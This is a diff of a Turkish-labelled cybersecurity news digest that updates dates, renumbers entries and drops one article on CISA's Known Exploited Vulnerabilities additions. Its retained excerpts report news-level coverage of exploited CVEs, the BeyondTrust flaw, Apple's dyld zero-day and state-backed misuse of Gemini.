+“VoidLink is positioned to become an even more powerful framework based on its capabilities and flexibility, as demonstrated through this apparent proof of concept.”
+
+Follow me on Twitter: @securityaffairs and Facebook and Mastodon
+
+(XXXXXXX, AÇIK - securityaffairs.com, 14.02.2026)
+
+================================================================================
+
+[14] Security Affairs - Attackers exploit BeyondTrust CVE-2026-1731 within hours of PoC release
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: Fri, 13 Feb 2026 15:19:09 +0000
 Link: https://securityaffairs.com/187962/uncategorized/attackers-exploit-beyondtrust-cve-2026-1731-within-hours-of-poc-release.html
@@ -675,11 +733,11 @@ The same IPs also target SonicWall, MOVEit, Log4j, Sophos, SSH, and IoT devices,
 
 Follow me on Twitter: @securityaffairs and Facebook and Mastodon
 
-(XXXXXXX, AÇIK - securityaffairs.com, 13.02.2026)
+(XXXXXXX, AÇIK - securityaffairs.com, 14.02.2026)
 
 ================================================================================
 
-[14] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
+[15] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: Fri, 13 Feb 2026 10:57:30 +0000
 Link: https://securityaffairs.com/187958/ai/google-state-backed-hackers-exploit-gemini-ai-for-cyber-recon-and-attacks.html
@@ -709,39 +767,7 @@ Google disabled accounts linked to this abuse and continues strengthening safegu
 
 Follow me on Twitter: @securityaffairs and Facebook and Mastodon
 
-(XXXXXXX, AÇIK - securityaffairs.com, 13.02.2026)
-
-================================================================================
-
-[15] Security Affairs - U.S. CISA adds SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities catalog
-────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 08:27:57 +0000
-Link: https://securityaffairs.com/187937/security/u-s-cisa-adds-solarwinds-web-help-desk-notepad-microsoft-configuration-manager-and-apple-devices-flaws-to-its-known-exploited-vulnerabilities-catalog.html
-
-[TAM METİN - 358 kelime]
-The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities (KEV) catalog.
-
-The first flaw added to the catalog is a Microsoft Configuration Manager SQL Injection Vulnerability tracked as CVE-2024-43468. An unauthenticated attacker could send specially crafted requests to the system and trigger unsafe processing, allowing them to execute commands on the server or underlying database.
-
-The second flaw added to the catalog is a Notepad++ Download of Code Without Integrity Check tracked as CVE-2025-15556. Vulnerability. Notepad++ versions before 8.8.9 using WinGUp have a flaw where updates aren’t verified. An attacker intercepting update traffic can make the updater run a malicious installer, allowing arbitrary code execution with the user’s privileges.
-
-The third flaw added to the catalog is a security control bypass vulnerability, tracked as CVE-2025-40536, that could allow an unauthenticated attacker to access certain restricted functionality within Web Help Desk. While more limited in scope than the critical flaws, successful exploitation could still expose sensitive features and weaken the application’s overall security posture.
-
-The last flaw added to the catalog is an Apple Multiple Buffer Overflow Vulnerability tracked as CVE-2026-20700.
-
-This week, Apple released updates for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS to address an actively exploited zero-day tracked as CVE-2026-20700. The flaw is a memory corruption issue in Apple’s Dynamic Link Editor (dyld) that lets attackers execute arbitrary code on vulnerable devices.
-
-Google’s Threat Analysis Group discovered and reported the issue, a circumstance that suggests the flaw may have been exploited by nation-state actors or commercial spyware vendors in attacks in the wild.
-
-According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.
-
-Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.
-
-CISA orders federal agencies to fix the vulnerabilities by March 5, 2026, except CVE-2025-40536, which must be solved by February 15, 2026.
-
-Follow me on Twitter: @securityaffairs and Facebook and Mastodon
-
-(XXXXXXX, AÇIK - securityaffairs.com, 13.02.2026)
+(XXXXXXX, AÇIK - securityaffairs.com, 14.02.2026)
 
 ================================================================================
 
@@ -752,7 +778,7 @@ Link: https://www.fortra.com/blog/urgent-warnings-uk-and-us-cyber-agencies-after
 
 ⚠️  Tam metin çekilemedi
 
-(XXXXXXX, AÇIK - fortra.com, 13.02.2026)
+(XXXXXXX, AÇIK - fortra.com, 14.02.2026)
 
 ================================================================================
 
@@ -788,7 +814,7 @@ Now, however, it is the alleged hacker who will be hoping he can escape receivin
 
 If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.
 
-(XXXXXXX, AÇIK - bitdefender.com, 13.02.2026)
+(XXXXXXX, AÇIK - bitdefender.com, 14.02.2026)
 
 ================================================================================
 
@@ -896,7 +922,7 @@ Graham Cluley is an award-winning keynote speaker who has given presentations ar
 
 Follow him on LinkedIn, Bluesky and Mastodon, or drop him an email.
 
-(XXXXXXX, AÇIK - grahamcluley.com, 13.02.2026)
+(XXXXXXX, AÇIK - grahamcluley.com, 14.02.2026)
 
 ================================================================================
 
@@ -968,7 +994,7 @@ Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities
 [1] McDermott, R. (2025) AI Knowledge Graph. Available at: https://github.com/robert-mcdermott/ai-knowledge-graph (Accessed: 18 January 2026 - 11 February 2026).
 [2] Reduan, M.H., (2025) Semantic Triples: Definition, Function, Components, Applications, Benefits, Drawbacks and Best Practices for SEO. Available at: https://www.linkedin.com/pulse/semantic-triples-definition-function-components-benefits-reduan-nqmec/ (Accessed: 11 February 2026).
 
-(XXXXXXX, AÇIK - isc.sans.edu, 13.02.2026)
+(XXXXXXX, AÇIK - isc.sans.edu, 14.02.2026)
 
 ================================================================================
 
@@ -979,7 +1005,7 @@ Link: https://isc.sans.edu/diary/rss/32714
 
 ⚠️  Tam metin çekilemedi
 
-(XXXXXXX, AÇIK - isc.sans.edu, 13.02.2026)
+(XXXXXXX, AÇIK - isc.sans.edu, 14.02.2026)
 
 ================================================================================
 
@@ -990,7 +1016,7 @@ Link: https://isc.sans.edu/diary/rss/32710
 
 ⚠️  Tam metin çekilemedi
 
-(XXXXXXX, AÇIK - isc.sans.edu, 13.02.2026)
+(XXXXXXX, AÇIK - isc.sans.edu, 14.02.2026)
 
 ================================================================================
 
@@ -1080,7 +1106,7 @@ Intelligence doesn't eliminate uncertainty—it makes uncertainty manageable. Ge
 
 The 2026 State of Security report was produced by Recorded Future's Insikt Group, comprising analysts and security researchers with deep government, law enforcement, military, and intelligence agency experience.
 
-(XXXXXXX, AÇIK - recordedfuture.com, 13.02.2026)
+(XXXXXXX, AÇIK - recordedfuture.com, 14.02.2026)
 
 ================================================================================
 
@@ -1192,7 +1218,7 @@ Download the full 2026 State of Security report
 
 The 2026 State of Security report was produced by Recorded Future's Insikt Group, which comprises analysts and security researchers with deep experience in government, law enforcement, the military, and intelligence agencies.
 
-(XXXXXXX, AÇIK - recordedfuture.com, 13.02.2026)
+(XXXXXXX, AÇIK - recordedfuture.com, 14.02.2026)
 
 ================================================================================
 
@@ -1246,7 +1272,7 @@ Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, an
 
 Download: Reduce 27-step Threat Hunts to 5 Simple Steps
 
-(XXXXXXX, AÇIK - recordedfuture.com, 13.02.2026)
+(XXXXXXX, AÇIK - recordedfuture.com, 14.02.2026)
 
 ================================================================================
 
@@ -1308,7 +1334,7 @@ Sean Cairncross' cybersecurity agenda: less regulation, more cooperation
 
 US wants to push its view of AI cybersecurity standards to the rest of the world
 
-(XXXXXXX, AÇIK - cyberscoop.com, 13.02.2026)
+(XXXXXXX, AÇIK - cyberscoop.com, 14.02.2026)
 
 ================================================================================
 
@@ -1376,7 +1402,7 @@ Sean Cairncross' cybersecurity agenda: less regulation, more cooperation
 
 US wants to push its view of AI cybersecurity standards to the rest of the world
 
-(XXXXXXX, AÇIK - cyberscoop.com, 13.02.2026)
+(XXXXXXX, AÇIK - cyberscoop.com, 14.02.2026)
 
 ================================================================================
 
@@ -1446,7 +1472,7 @@ Sean Cairncross' cybersecurity agenda: less regulation, more cooperation
 
 US wants to push its view of AI cybersecurity standards to the rest of the world
 
-(XXXXXXX, AÇIK - cyberscoop.com, 13.02.2026)
+(XXXXXXX, AÇIK - cyberscoop.com, 14.02.2026)
 
 ================================================================================
 
@@ -1510,7 +1536,7 @@ National Broadband Network
 
 Telecommunications Act of 1996
 
-(XXXXXXX, AÇIK - go.theregister.com, 13.02.2026)
+(XXXXXXX, AÇIK - go.theregister.com, 14.02.2026)
 
 ================================================================================
 
@@ -1620,7 +1646,7 @@ Quantum key distribution
 
 Trusted Platform Module
 
-(XXXXXXX, AÇIK - go.theregister.com, 13.02.2026)
+(XXXXXXX, AÇIK - go.theregister.com, 14.02.2026)
 
 ================================================================================
 
@@ -1664,7 +1690,7 @@ By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, 
 
 Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®
 
-(XXXXXXX, AÇIK - go.theregister.com, 13.02.2026)
+(XXXXXXX, AÇIK - go.theregister.com, 14.02.2026)
 
 ================================================================================
 
